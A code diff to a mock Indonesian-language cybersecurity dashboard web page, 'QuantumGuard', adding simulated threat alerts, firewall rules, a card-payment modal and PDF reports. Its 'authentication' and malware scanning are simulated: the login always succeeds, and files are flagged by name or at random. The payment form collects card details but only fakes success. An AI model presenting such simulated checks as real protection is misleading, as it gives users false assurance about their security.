+        const notificationDropdown = document.getElementById('notification-dropdown');
+        const notificationPanel = document.getElementById('notification-panel');
+        const notifList = document.getElementById('notif-list');
+        const threatCountEl = document.getElementById('threat-count');
+        const blockAllBtn = document.getElementById('block-all-btn');
+
+        const firewallInput = document.getElementById('firewall-input');
+        const firewallAddButton = document.getElementById('firewall-add-button');
+        const reportCard = document.getElementById('report-card');
+        const activateProButton = document.getElementById('activate-pro-button');
+        const generateReportButton = document.getElementById('generate-report-button');
+        const proStatusText = document.getElementById('pro-status-text');
+        const paymentModal = document.getElementById('payment-modal');
+        const paymentForm = document.getElementById('payment-form');
+        const loadingAnimation = document.getElementById('loading-animation');
+        const payButton = document.getElementById('pay-button');
+        const paymentTitle = document.getElementById('payment-title');
+        const paymentText = document.getElementById('payment-text');
+
+        const navLinks = document.getElementById('nav-links');
+        const navItems = document.querySelectorAll('.nav-link');
+        const hamburgerMenu = document.getElementById('hamburger');
+        const userInfoBar = document.getElementById('user-info-bar');
+        const userAvatar = document.getElementById('user-avatar');
+
+        const dashboardPage = document.getElementById('dashboard-page');
+        const toolsPage = document.getElementById('tools-page');
+        const proPage = document.getElementById('pro-page');
+        const aboutPage = document.getElementById('about-page');
+        
+        const DEFAULT_AVATAR = "https://via.placeholder.com/40/03a9f4/FFFFFF?text=P";
+
 
         let cameraActive = false;
         let blockedCounter = 0;
         let keyGenerated = false;
-        let authenticatedUsers = []; 
-        let latestImageDataUrl = null;
-
-        const staticUsers = [
-            { name: "A. Smith", image: "https://randomuser.me/api/portraits/men/32.jpg" },
-            { name: "J. Ramirez", image: "https://randomuser.me/api/portraits/women/44.jpg" },
-            { name: "C. Lee", image: "https://randomuser.me/api/portraits/men/78.jpg" },
-        ];
-
+        let isProActive = false;
+        let firewallRules = [];
+        let unblockedThreats = [];
 
         const trafficChart = new Chart(networkTrafficChart, {
             type: 'line',
@@ -841,7 +1275,9 @@
             canvas.height = webcamStream.videoHeight;
             const context = canvas.getContext('2d');
             context.drawImage(webcamStream, 0, 0, canvas.width, canvas.height);
-            latestImageDataUrl = canvas.toDataURL('image/jpeg');
+            const imageDataUrl = canvas.toDataURL('image/jpeg');
+            
+            localStorage.setItem('userAvatar', imageDataUrl);
 
             setTimeout(() => {
                 statusMessage.innerText = "Otentikasi berhasil!";
@@ -850,73 +1286,25 @@
                 scanLine.style.backgroundColor = 'var(--green-color)';
 
                 webcamStream.srcObject.getTracks().forEach(track => track.stop());
-
-                consentModal.style.display = 'flex';
+                
+                showWelcomeAnimation(imageDataUrl);
             }, 3000);
         });
 
-        agreeButton.addEventListener('click', async () => {
-            consentModal.style.display = 'none';
-            await uploadImageAndLogin(true);
-        });
-
-        rejectButton.addEventListener('click', async () => {
-            consentModal.style.display = 'none';
-            await uploadImageAndLogin(false);
-        });
-
-        async function uploadImageAndLogin(upload) {
-            let imageUrl = DEFAULT_AVATAR; 
-            const userName = `Pengguna Baru (${Math.floor(Math.random() * 1000)})`;
-
-            if (upload) {
-                try {
-                    const formData = new FormData();
-                    formData.append('file', latestImageDataUrl);
-                    formData.append('upload_preset', UPLOAD_PRESET);
-
-                    const response = await fetch(CLOUDINARY_UPLOAD_URL, {
-                        method: 'POST',
-                        body: formData,
-                    });
-                    
-                    if (!response.ok) {
-                        const errorData = await response.json();
-                        throw new Error(`Upload failed with status ${response.status}: ${errorData.error.message}`);
-                    }
-                    
-                    const data = await response.json();
-                    imageUrl = data.secure_url;
-                    addLog(systemLog, `<span class="green">INFO:</span> Foto pengguna berhasil diunggah.`);
-                } catch (error) {
-                    console.error("Gagal mengunggah gambar:", error);
-                    addLog(systemLog, `<span class="red">ERROR:</span> Gagal mengunggah foto pengguna. Status: <span class="yellow">Menggunakan avatar default.</span>`);
-                    imageUrl = DEFAULT_AVATAR;
-                }
-            } else {
-                addLog(systemLog, `<span class="blue">INFO:</span> Pengguna menolak mengunggah foto. Menggunakan avatar default.`);
-            }
-
-            authenticatedUsers.unshift({
-                name: userName,
-                image: imageUrl
-            });
-
-            showWelcomeAnimation();
-        }
-
-        function showWelcomeAnimation() {
+        function showWelcomeAnimation(avatarUrl) {
             loginContainer.style.transform = 'scale(0.8)';
             loginContainer.style.opacity = '0';
             setTimeout(() => {
                 loginContainer.style.display = 'none';
                 welcomeSplash.classList.add('active');
 
+                // Set user avatar in navbar
+                userAvatar.src = avatarUrl;
+                
                 setTimeout(() => {
                     welcomeSplash.style.opacity = '0';
                     welcomeSplash.style.visibility = 'hidden';
                     transitionToCyberSecurityPage();
-                    loadUsers();
                     startDashboardFunctions();
                 }, 4000);
             }, 500);
@@ -926,45 +1314,130 @@
             cyberSecurityPage.style.display = 'block';
             setTimeout(() => {
                 cyberSecurityPage.style.opacity = '1';
-            }, 50); 
+            }, 50);
         }
 
-        function loadUsers() {
-            userGrid.innerHTML = '';
-            const allUsers = [...authenticatedUsers, ...staticUsers];
+        function showPage(pageId) {
+            const pages = document.querySelectorAll('.page-content');
+            pages.forEach(page => page.classList.remove('active'));
+            document.getElementById(pageId + '-page').classList.add('active');
 
-            allUsers.forEach((user, index) => {
-                const userProfile = document.createElement('div');
-                userProfile.className = 'user-profile';
-                userProfile.innerHTML = `
-                    <img src="${user.image}" alt="${user.name}">
-                    <span>${user.name}</span>
-                `;
-                userGrid.appendChild(userProfile);
-                setTimeout(() => {
-                    userProfile.classList.add('show');
-                }, index * 100);
-            });
+            navItems.forEach(item => item.classList.remove('active'));
+            document.querySelector(`[data-page="${pageId}"]`).classList.add('active');
+
+            // Hide menu on mobile after selection
+            if (window.innerWidth <= 768) {
+                navLinks.classList.remove('active');
+                userInfoBar.classList.remove('active');
+            }
         }
 
         const MAX_LOGS = 6;
-        function addLog(panel, message) {
+        let threatIdCounter = 0;
+
+        function addLog(panel, message, isThreat = false, ip = null) {
             const newLog = document.createElement('div');
+            newLog.className = 'log-entry';
             newLog.innerHTML = `<span class="gray">[${new Date().toLocaleTimeString()}]</span> ${message}`;
+            
             panel.prepend(newLog);
             while (panel.children.length > MAX_LOGS) {
                 panel.removeChild(panel.lastChild);
             }
+            
+            if (isThreat) {
+                const threat = {
+                    id: `threat-${threatIdCounter++}`,
+                    message: message,
+                    ip: ip,
+                    isBlocked: false,
+                    logElement: newLog
+                };
+                unblockedThreats.push(threat);
+                updateThreatCount();
+            }
         }
+
+        function updateThreatCount() {
+            const count = unblockedThreats.filter(t => !t.isBlocked).length;
+            threatCountEl.innerText = count;
+            if (count > 0) {
+                threatCountEl.style.display = 'block';
+                notificationDropdown.classList.add('active');
+            } else {
+                threatCountEl.style.display = 'none';
+                notificationDropdown.classList.remove('active');
+                blockAllBtn.style.display = 'none';
+            }
+            renderNotificationPanel();
+        }
+
+        function renderNotificationPanel() {
+            notifList.innerHTML = '';
+            const unblocked = unblockedThreats.filter(t => !t.isBlocked);
+            if (unblocked.length === 0) {
+                notifList.innerHTML = '<div style="text-align: center; color: var(--gray-light);">Tidak ada ancaman.</div>';
+                blockAllBtn.style.display = 'none';
+                return;
+            }
+
+            unblocked.forEach(threat => {
+                const notifItem = document.createElement('div');
+                notifItem.className = 'notification-item threat';
+                notifItem.innerHTML = `
+                    <span>${threat.message}</span>
+                    <button class="block-btn" data-id="${threat.id}">Blokir</button>
+                `;
+                notifList.appendChild(notifItem);
+            });
+            blockAllBtn.style.display = 'block';
+        }
+
+        function toggleNotifPanel(event) {
+            event.preventDefault();
+            const isPanelVisible = notificationPanel.style.display === 'flex';
+            if (isPanelVisible) {
+                notificationPanel.style.display = 'none';
+            } else {
+                notificationPanel.style.display = 'flex';
+                renderNotificationPanel();
+            }
+        }
+        
+        document.addEventListener('click', (e) => {
+            if (e.target.classList.contains('block-btn')) {
+                const threatId = e.target.getAttribute('data-id');
+                blockThreat(threatId);
+            }
+        });
+
+        blockAllBtn.addEventListener('click', () => {
+            const unblocked = unblockedThreats.filter(t => !t.isBlocked);
+            unblocked.forEach(threat => blockThreat(threat.id));
+        });
+
+        function blockThreat(threatId) {
+            const threat = unblockedThreats.find(t => t.id === threatId);
+            if (!threat || threat.isBlocked) return;
+
+            threat.isBlocked = true;
+            blockedCounter++;
+            blockedCount.innerText = blockedCounter;
+
+            threat.logElement.innerHTML = `<span class="gray">[${new Date().toLocaleTimeString()}]</span> <span class="green">Ancaman Terblokir:</span> IP <span class="yellow">${threat.ip}</span> <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="color: var(--green-color); vertical-align: middle; margin-left: 5px;"><path d="M22 11.08V12a10 10 0 1 1-5.93-8.86"/><polyline points="22 4 12 14.01 9 11.01"/></svg>`;
+            
+            updateThreatCount();
+        }
+
 
         function startDashboardFunctions() {
             let lastTraffic = 20;
             setInterval(() => {
                 const isThreat = Math.random() < 0.05;
                 if (isThreat) {
-                    blockedCounter++;
-                    blockedCount.innerText = blockedCounter;
-                    addLog(threatLog, `<span class="red">Ancaman Terdeteksi:</span> Upaya akses dari IP asing <span class="yellow">203.0.113.129</span>`);
+                    const randomIp = `203.0.113.${Math.floor(Math.random() * 255)}`;
+                    const threatMessage = `<span class="red">Ancaman Terdeteksi:</span> Upaya akses dari IP asing <span class="yellow">${randomIp}</span>`;
+                    addLog(threatLog, threatMessage, true, randomIp);
                 } else {
                     addLog(threatLog, `<span class="green">Lalu Lintas Aman:</span> Paket dari ` + Math.floor(Math.random() * 100) + `.[internal] diterima.`);
                 }
@@ -1017,7 +1490,7 @@
             setTimeout(() => {
                 const isMalware = fileName.includes('.exe') || fileName.includes('virus') || Math.random() < 0.1;
                 if (isMalware) {
-                    addLog(malwareLog, `<span class="red">Ancaman Terdeteksi:</span> File <span class="yellow">${fileName}</span> terinfeksi. Status: Dikuarantina.`);
+                    addLog(malwareLog, `<span class="red">Ancaman Terdeteksi:</span> File <span class="yellow">${fileName}</span> terinfeksi. Status: Dikuarantina.`, true);
                 } else {
                     addLog(malwareLog, `<span class="green">Hasil:</span> File <span class="yellow">${fileName}</span> bersih dari ancaman.`);
                 }
@@ -1042,7 +1515,106 @@
             addLog(systemLog, `<span class="blue">INFO:</span> Kunci enkripsi baru berhasil dibuat.`);
         });
 
-        window.onload = startCamera;
+        firewallAddButton.addEventListener('click', () => {
+            const rule = firewallInput.value.trim();
+            if (rule === '') {
+                addLog(firewallLog, '<span class="red">Error:</span> Aturan tidak boleh kosong.');
+                return;
+            }
+            firewallRules.push(rule);
+            addLog(firewallLog, `<span class="green">Berhasil:</span> Aturan baru ditambahkan: <span class="yellow">${rule}</span>`);
+            firewallInput.value = '';
+        });
+
+        activateProButton.addEventListener('click', () => {
+            paymentModal.style.display = 'flex';
+            paymentForm.style.display = 'flex';
+            loadingAnimation.style.display = 'none';
+        });
+
+        payButton.addEventListener('click', () => {
+            const cardNumber = document.getElementById('credit-card-input').value;
+            const expiry = document.getElementById('expiry-input').value;
+            const cvv = document.getElementById('cvv-input').value;
+            
+            if (cardNumber === '' || expiry === '' || cvv === '') {
+                alert('Mohon lengkapi semua data pembayaran.');
+                return;
+            }
+            
+            paymentForm.style.display = 'none';
+            loadingAnimation.style.display = 'flex';
+
+            setTimeout(() => {
+                loadingAnimation.style.display = 'none';
+                paymentTitle.innerHTML = `<span style="color: var(--green-color);">Pembayaran Berhasil!</span>`;
+                paymentText.innerText = "Layanan QuantumGuard Pro sudah aktif. Anda dapat kembali ke halaman sebelumnya.";
+                
+                isProActive = true;
+                reportCard.classList.add('pro-active');
+                proStatusText.innerHTML = 'Selamat! Layanan **QuantumGuard Pro** sudah aktif.';
+                activateProButton.style.display = 'none';
+                generateReportButton.style.display = 'block';
+                addLog(systemLog, `<span class="green">INFO:</span> Layanan QuantumGuard Pro berhasil diaktifkan!`);
+
+                setTimeout(() => {
+                    paymentModal.style.display = 'none';
+                }, 2000);
+            }, 3000);
+        });
+
+        generateReportButton.addEventListener('click', () => {
+            if (!isProActive) {
+                addLog(systemLog, `<span class="red">ERROR:</span> Fitur Pro belum aktif.`);
+                return;
+            }
+
+            addLog(systemLog, `<span class="blue">INFO:</span> Sedang membuat laporan PDF...`);
+            setTimeout(() => {
+                const doc = new jsPDF();
+                
+                doc.setFont('Helvetica', 'bold');
+                doc.setFontSize(20);
+                doc.text('Laporan Keamanan QuantumGuard', 14, 20);
+                
+                doc.setFont('Helvetica', 'normal');
+                doc.setFontSize(12);
+                doc.text(`Tanggal: ${new Date().toLocaleDateString()}`, 14, 30);
+                doc.text(`Waktu: ${new Date().toLocaleTimeString()}`, 14, 35);
+                
+                doc.setFontSize(14);
+                doc.text('Ringkasan Keamanan', 14, 50);
+                
+                doc.setFontSize(12);
+                doc.text(`- Ancaman Terdeteksi: ${blockedCounter}`, 14, 60);
+                doc.text(`- Server Status: Online`, 14, 65);
+                doc.text(`- Ping Rata-rata: ${Math.round(parseFloat(pingLatency.innerText))}ms`, 14, 70);
+                doc.text(`- Aturan Firewall: ${firewallRules.length}`, 14, 75);
+                
+                doc.save('Laporan_Keamanan_QuantumGuard.pdf');
+                addLog(systemLog, `<span class="green">INFO:</span> Laporan PDF berhasil dibuat dan diunduh.`);
+            }, 1500);
+        });
+
+        hamburgerMenu.addEventListener('click', () => {
+            navLinks.classList.toggle('active');
+            userInfoBar.classList.toggle('active');
+        });
+        
+        // Load avatar from localStorage on page load
+        function loadAvatar() {
+            const avatarUrl = localStorage.getItem('userAvatar');
+            if (avatarUrl) {
+                userAvatar.src = avatarUrl;
+            } else {
+                userAvatar.src = DEFAULT_AVATAR;
+            }
+        }
+
+        window.onload = () => {
+            loadAvatar();
+            startCamera();
+        };
     </script>
 </body>
 </html>
